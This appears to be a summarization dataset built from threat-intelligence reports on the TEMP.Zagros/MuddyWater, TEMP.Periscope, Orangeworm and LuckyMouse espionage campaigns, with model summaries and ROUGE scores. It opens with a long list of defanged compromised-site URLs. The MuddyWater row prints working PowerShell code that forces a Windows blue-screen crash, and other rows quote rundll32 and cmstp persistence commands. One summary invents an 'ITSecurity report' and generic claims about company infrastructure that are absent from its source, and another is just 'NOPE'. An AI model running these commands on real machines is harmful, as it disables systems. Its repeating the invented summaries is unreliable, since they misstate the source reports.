ip[.]co[.]uk//db_template.phphxxp://always-beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com/wp-admin/db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew-snyder[.]net/bootstrap/db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta-armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za/images/db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor-clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com/wp-includes/db_template.phphxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://alissanicolai[.]com/assets/db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za/php/db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za/trendy1/db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com/wp-admin/db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com/tmp/db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com/admin/db_template.phphxxps://allusdoctors[.]com/themes/db_template.phphxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.phphxxp://itengineering[.]co.za/gatewaydiamond/db_template.phphxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net/wp-includes/db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc-sec[.]net//db_template.phphxxp://ldams[.]org.ls/supplies/db_template.phphxxp://menaboracks[.]co.za/tmp/db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za/templates/db_template.phphxxp://fccorp[.]co.za/php/db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws-gov[.]co.za//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com/widgetstyles/db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com/wp-includes/db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com/admin/db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com/wpimages/db_template.phphxxp://glgroup[.]co.za/images/db_template.phphxxp://hisandherskennels[.]co.za/php/db_template.phphxxp://alemaohost[.]com/lotosorg[.]com/db_template.phphxxp://isibaniedu[.]co.za/admin/db_template.phphxxp://dianakleyn[.]co.za/layouts/db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za/js/db_template.phphxxp://highschoolsuperstar[.]co.za/files/db_template.phphxxp://www.ambientproperty[.]com//db_template.phphxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za/font-awesome/db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za/css/db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com/wp-includes/db_template.phphxxp://allisonplumbing[.]com/wp-includes/db_template.phphxxp://eastrandmotorlab[.]co.za/fleet/db_template.phphxxp://angelsongroup[.]com/wp-includes/db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb-racing[.]co.za/htdocs/db_template.phphxxp://anotherpartofme[.]com/wp-includes/db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc-u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk/shopping/db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com/wp-includes/db_template.phphxxp://colenesphotography[.]co.za/modules/db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com/thumbs/db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es/storefront/db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za/js/db_template.phphxxp://promechtransport[.]co.za/scripts/db_template.phphxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com/gallonature/db_template.phphxxp://oftheearthphotography[.]com/www/db_template.phphxxp://h-dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com/downloads/db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com/email_template/db_template.phphxxp://funisalodge[.]co.za/data1/db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs-consult[.]com//db_template.phphxxp://www.animationinisrael[.]org/tmp_images/db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za/photography/db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.phphxxp://almeriahotelja[.]com/dk/db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com/assets/db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com/leadership/db_template.phphxxps://ahelicoptermom[.]com/wp-includes/db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com/wp-admin/db_template.phphxxp://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za/test/db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phphxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org/wp-admin/db_template.phphxxp://www.alexandrasternin[.]com/illustration/db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za/assets/db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek-intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.phphxxp://alorabrownies[.]com/wp-admin/db_template.phphxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.phphxxp://cazochem[.]co.za/cazochem/db_template.phphxxp://debnoch[.]com/image/db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz/admin/db_template.phphxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://insta-art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com/uploads/db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.phphxxp://amruthavana[.]com/blog/db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za/wpimages/db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za/images/db_template.phphxxps://www.apliety[.]co.il/wp-includes/db_template.phphxxp://alchamelup[.]org/htdocs/db_template.phphxxp://benonicoc[.]co.za/resources/db_template.phphxxps://al-mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phphxxp://alphabee.fund/PHPMailer_5.2.0/db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com/wp-includes/db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls/modules/db_template.phphxxp://apironco[.]com/wp-includes/db_template.phphxxp://digital-cameras-south-africa[.]co.za/script/db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl/next/db_template.phphxxp://juniorad[.]co.za/vendor/db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com/allaccess/db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phphxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za/less/db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com/wp1/db_template.phphxxp://anet-international-group[.]com/shop/db_template.phphxxp://courtesydriving[.]co.za/js/db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma-law[.]co.za//db_template.phphxxp://amari[.]ro/components/db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com/wp/wp-includes/db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com/dnsarabia[.]com/db_template.phphxxp://airesis.blog/wp-admin/db_template.phphxxp://www.aptibet[.]org//db_template.phphxxp://alecattic[.]com/wp-includes/db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za/wpscripts/db_template.phphxxp://www";"FireEye observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macrobased documents to individuals in Asia and the Middle East from January 2018 to March 2018. The threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. In this spear phishing campaign, the threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1. The first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macrobased document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2. Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3. The second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. The ITSecurity report found that the threat group TEMP.Zagros was using a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog. The threat group TEMP.Zagros has weaponized their malware by dropping three files, Defender.sct, DefenderService.inf, and WindowsDefender.ini, in a hard coded path, C:\programdata. Additionally, the macro will set a registry key to achieve persistence, ""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.inf. Upon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. The ITSecurity report states that the WindowsDefender.ini file contains a malicious PowerShell script. The PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools. Some of the key obfuscation techniques used are: Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult. PowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. The response from the PowerShell script is as shown in Figure 15.Figure 15: Response from PowerShell script The ITSecurity report highlights the need for improved security measures in order to protect the company's IT infrastructure. The report outlines the current security measures in place, as well as the potential risks and vulnerabilities. The report also provides recommendations on how to improve the security of the company's IT infrastructure.";en;{'r': 0.16766917293233083, 'p': 0.861003861003861, 'f': 0.28067967002159677};{'r': 0.1353258613532586, 'p': 0.7375565610859729, 'f': 0.22869168450736393};{'r': 0.1661654135338346, 'p': 0.8532818532818532, 'f': 0.2781623635395326}
https://www.mandiant.com/resources/blog/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries;Suspected Chinese Cyber Espionage Group (TEMP.Periscope) Targeting U.S. Engineering and Maritime Industries;"Intrusions Focus on the Engineering and Maritime SectorSince early 2018, FireEye (including our FireEye as a Service (FaaS), Mandiant Consulting, and iSIGHT Intelligence teams) has been tracking an ongoing wave of intrusions targeting engineering and maritime entities, especially those connected to South China Sea issues. The campaign is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope. The group has also been reported as ""Leviathan"" by other security firms.The current campaign is a sharp escalation of detected activity since summer 2017. Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit. Known targets of this group have been involved in the maritime industry, as well as engineering-focused entities, and include research institutes, academic organizations, and private firms in the United States. FireEye products have robust detection for the malware used in this campaign.TEMP.Periscope BackgroundActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities. However, the group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on ""NanHaiShu.""TTPs and Malware UsedIn their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other suspected Chinese groups. These tools include:AIRBREAK: a JavaScript-based backdoor also reported as ""Orz"" that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration.PHOTO: a DLL backdoor also reported publicly as ""Derusbi"", capable of obtaining directory, file, and drive listing, creating a reverse shell, performing screen captures, recording video and audio, listing, terminating, and creating processes, enumerating, starting, and deleting registry keys and values, logging keystrokes, returning usernames and passwords from protected storage, and renaming, deleting, copying, moving, reading, and writing to files.HOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors. Some strings are obfuscated with XOR x56. The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session.LUNCHMONEY: an uploader that can exfiltrate files to Dropbox.MURKYTOP: a command-line reconnaissance tool. It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts.China Chopper: a simple code injection webshell that executes Microsoft .NET code within HTTP POST commands. This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime.The following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity:Beacon: a backdoor that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments. The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands.BLACKCOFFEE: a backdoor that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal. Used by APT17 and other Chinese cyber espionage operators.Additional identifying TTPs include:Spear phishing, including the use of probably compromised email accounts.Lure documents using CVE-2017-11882 to drop malware.Stolen code signing certificates used to sign malware.Use of bitsadmin.exe to download additional tools.Use of PowerShell to download additional tools.Using C:\Windows\Debug and C:\Perflogs as staging directories.Leveraging Hyperhost VPS and Proton VPN exit nodes to access webshells on internet-facing systems.Using Windows Management Instrumentation (WMI) for persistence.Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence.Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal.ImplicationsThe current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations.As we continue to investigate this activity, we may identify additional data leading to greater analytical confidence linking the operation to TEMP.Periscope or other known threat actors, as well as previously unknown campaigns.IndicatorsFile Hash Description x.js 3fefa55daeb167931975c22df3eca20a HOMEFRY, a 64-bit Windows password dumper/cracker mt.exe 40528e368d323db0ac5c3f5e1efe4889 MURKYTOP, a command-line reconnaissance tool com4.js a68bf5fce22e7f1d6f999b7a580ae477 AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpagesHistorical Indicators";"TEMP.Periscope is a group of suspected Chinese cyber espionage actors who have been targeting engineering and maritime entities since early 2018. The group is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope. The group has also been reported as ""Leviathan"" by other security firms. The current campaign is a sharp escalation of detected activity since summer 2017. Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently reemerged and has been observed conducting operations with a revised toolkit. Known targets of this group have been involved in the maritime industry, as well as engineeringfocused entities, and include research institutes, academic organizations, and private firms in the United States. FireEye products have robust detection for the malware used in this campaign. TEMP.Periscope has primarily focused on maritimerelated targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities. However, the group has also targeted professional/consulting services, hightech industry, healthcare, and media/publishing. Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on ""NanHaiShu. ""TTPs and Malware UsedIn their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other";en;{'r': 0.27364185110663986, 'p': 0.951048951048951, 'f': 0.42499999652973636};{'r': 0.24528301886792453, 'p': 0.9154929577464789, 'f': 0.3869047585716058};{'r': 0.2716297786720322, 'p': 0.9440559440559441, 'f': 0.4218749965297364}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia;New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia;"No concern about being discoveredKwampirs uses a fairly aggressive means to propagate itself once inside a victim's network by copying itself over network shares. While this method is considered somewhat old, it may still be viable for environments that run older operating systems such as Windows XP. This method has likely proved effective within the healthcare industry, which may run legacy systems on older platforms designed for the medical community. Older systems like Windows XP are much more likely to be prevalent within this industry.Additionally, once infected, the malware cycles through a large list of command and control (C&C) servers embedded within the malware. It appears while the list is extensive, not all of the C&Cs are active and continue to beacon until a successful connection is established. Despite modifying a small part of itself while copying itself across the network as a means to evade detection, the operators have made no effort to change the C&C communication protocol since its first inception.Both of these methods are considered particularly ""noisy"" and may indicate that Orangeworm is not overly concerned with being discovered. The fact that little has changed with the internals of Kwampirs since its first discovery may also indicate that previous mitigation methods against the malware have been unsuccessful, and that the attackers have been able to reach their intended targets despite defenders being aware of their presence within their network.";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html;Analysis of new MuddyWater Samples;"INTRODUCTIONIt has been over 2 months since I last wrote about MuddyWater or Temp.Zagros as named by FireEye . To be honest, I felt they were going quiet for a while, but boy was I wrong. Starting this week I have picked up some new interesting samples. Although these new samples have lots of similarities with the ones from earlier in the year, there are still some interesting aspects and additional, you guessed it, obfuscation used in the new samples. Their heavy focus on layered obfuscation and preference for PowerShell is still apparent. However, I will highlight what changed based on the samples that I have analyzed.Below are screenshots of some of the recent lure documents used by this group. All Hashes are at the end of the blog.You can see from the above screenshots that their targeting seem to continue to focus on the Middle East Region (Turkey and Iraq) and Pakistan. As mentioned in my previous blogs , these lures can give us an idea of the organizations and industries that might have been targeted by this wave.The timeline of these lures based on VT submission dates seems to be from Mid Feb all the way to the most recent sample dated May 6, 2018 which I will be focusing on. The sample has the name ""mofa.gov.iq.doc"" - 94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad. MOFA of course stands for Ministry of Foreign Affairs.FROM MACRO TO POWERSTATS - STEP BY STEP ANALYSISI will be analyzing the sample in detail this time. I will only highlight any new/modified aspects from the obfuscation used or any additional functionality in the POWERSTATS backdoor.The document contains a Macro code with multiple Base64 encoded segments as shown belowThe first Base64 encoded variable decodes to a another chunk of encoded data as shown below. We will get back to this later onThe second Base64 encoded variable decodes to "" c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1, ""The third Base64 encoded variable decodes to an encoded XML file that include a obfuscated Java Script as shown belowOnce you decode the Javascript that is embedded in the XML file you will be presented with the belowThe decoded script is in fact a PowerShell script that is performing further decoding routine on a file called ""C:\\\\ProgramData\\\\WindowsDefenderService.ini"" .The content of this file is actually the encoded data from the first Base64 chunk. Once decoded, the content looks familiar as it is indeed a variant of the POWERSTATS backdoor. Lets go through a couple of the obfuscation layers used in this variant.First, decoding the data chunk will result in the following encoded PowerShell Notice the use of iex which is a variant of Invoke-Expression . In order to see the output of this, we substitute iex with Write-Output and we will be presented with the belowAlthough it looks messy, it does look familiar, The character substitution functions and the character replacements. We are getting closer. You can notice in the image above the ""&((vaRIABle '*MDR*').NAME[3,11,2]-jOiN'')"" . This in fact is Invoke-Expression just obfuscated. This means we can replace it with Write-Output as well. and the result script is something that looks like thisAgain, you can notice the use of ""( $enV:ComSpEc[4,24,25]-jOiN'')"" which is iex . Meaning we can replace it again with Write-Output .This circle of obfuscation keeps going on until we reach the decoded script which we are familiar with including the Proxy URLs and the IP identification as shown belowThis, of course is just one part of the big encoded PS script. The second and third part are the actual functionality of the Backdoor.SO WHAT IS NEW OR NOTMost of the functionality that I described in my last blog still exists with the new variants. However, there are some new additions and some modifications on the code:Screenshot function is re-written however the same purpose remains. It takes a screenshot of the victim's screen, saves it as PNG, converts it to bytes, encodes it with Base64 and then uploads it to the C&C. Inclusion of a Blue Screen of Death or BSOD code in case a certain process is found. This part of anti-debugging and anti-analysis technique The function highlighted at the bottom of the picture "" GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG "" leads to a piece of code:function GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG(){$s = @""using System,using System.Runtime.InteropServices,public static class C{[DllImport(""ntdll.dll"")]public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue),[DllImport(""ntdll.dll"")]public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response),public static unsafe void Kill(){Boolean tmp1,uint tmp2,RtlAdjustPrivilege(19, true, false, out tmp1),NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2),}}""@$c = new-object -typename system.CodeDom.Compiler.CompilerParameters$c.CompilerOptions = '/unsafe'$a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c[C]::Kill()} This is an exact copy of Invoke-BSOD Barrett Adams (@peewpw) code that was created by about a month ago and is available on his GitHub page. One thing to note is that this code can BSOD a machine without the need for admin privileges as described by the author. The same function and code is also used if processes that include ""cmd.exe, PowerShell.exe or Powershell_ISE.exe"" exist on the vicitm system. There is also a function that is looking for the following strings within ProgramData folder - "" Kasper, Panda and ESET "" . If found, then the screenshot functionality and upload function will break.FINAL THOUGHTSAs with other iterations and previous write-ups about this group, they seem to have been continuing their activity and targeting different countries. In this wave they seem to have:Included an additional layer of obfuscation to the main backdoor code by using Base64 -> Obfuscated JS in XML -> Powershell character manipulations before you are presented with the encoded POWERSTATS variant. Updated section of the POWERSTATS code to include a BSOD functionality to battle Analysis and debugging. Only relies on DDEInitiate to move laterally. They seem to have ditched the other two methods from previous samples.INDICATORS OF COMPROMISEHASHES 94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad5c7d16bd89ef37fe02cac1851e7214a01636ee4061a80bfdbde3a2d199721a7976e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338707d2128a0c326626adef0d3a4cab78562abd82c2bd8ede8cc82f86c01f1e024b7b8faac19a58548b28506415f9ece479055e9af0557911ca8bbaa82b483ffb818cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cdPROXY LIST";"The sample contains a Macro code with multiple Base64 encoded segments as shown below. The first Base64 encoded variable decodes to a another chunk of encoded data as shown below. We will get back to this later on. The second Base64 encoded variable decodes to ""c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,"". The third Base64 encoded variable decodes to an encoded XML file that include a obfuscated Java Script as shown below. Once you decode the Javascript that is embedded in the XML file you will be presented with the below. The decoded script is in fact a PowerShell script that is performing further decoding routine on a file called ""C:\ProgramData\WindowsDefenderService.ini"". The content of this file is actually the encoded data from the first Base64 chunk. Once decoded, the content looks familiar as it is indeed a variant of the POWERSTATS backdoor. Lets go through a couple of the obfuscation layers used in this variant. First, decoding the data chunk will result in the following encoded PowerShell Notice the use of iex which is a variant of InvokeExpression . In order to see the output of this, we substitute iex with WriteOutput and we will be presented with the below. Although it looks messy, it does look familiar; The character substitution functions and the character replacements. We are getting closer. You can notice in the image above the ""&((vaRIABLE '*MDR*').NAME[3,11,2]jOiN'"")"" . This in fact is InvokeExpression just obfuscated. This is an exact copy of InvokeBSOD Barrett Adams (@peewpw) code that was created";en;{'r': 0.25102880658436216, 'p': 0.9312977099236641, 'f': 0.3954619091349632};{'r': 0.2149321266968326, 'p': 0.8597285067873304, 'f': 0.34389139951493214};{'r': 0.25102880658436216, 'p': 0.9312977099236641, 'f': 0.3954619091349632}
https://securelist.com/luckymouse-hits-national-data-center/86083/;LuckyMouse hits national data center to organize country-level waterholing campaign;What happened?In March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017. The choice of target made this campaign especially significant - it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country's official websites in order to conduct watering hole attacks.The operators used the HyperBro Trojan as their last-stage in-memory remote administration tool (RAT). The timestamps for these modules are from December 2017 until January 2018. The anti-detection launcher and decompressor make extensive use of Metasploit's shikata_ga_nai encoder as well as LZNT1 compression.Kaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, Trojan-Downloader.Win32.Upatre and Backdoor.Win32.HyperBro. A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com).Who's behind it?Due to tools and tactics in use we attribute the campaign to LuckyMouse Chinese-speaking actor (also known as EmissaryPanda and APT27). Also the C2 domain update.iaacstudio[.]com was previously used in their campaigns. The tools found in this campaign, such as the HyperBro Trojan, are regularly used by a variety of Chinese-speaking actors. Regarding Metasploit's shikata_ga_nai encoder - although it's available for everyone and couldn't be the basis for attribution, we know this encoder has been used by LuckyMouse previously.Government entities, including the Central Asian ones also were a target for this actor before. Due to LuckyMouse's ongoing waterholing of government websites and the corresponding dates, we suspect that one of the aims of this campaign is to access web pages via the data center and inject JavaScripts into them.How did the malware spread?The initial infection vector used in the attack against the data center is unclear. Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can't prove they were related to this particular attack. It's possible the actor used a waterhole to infect data center employees.The main C2 used in this campaign is bbs.sonypsps[.]com, which resolved to IP-address, that belongs to the Ukrainian ISP network, held by a Mikrotik router using firmware version 6.34.4 (from March 2016) 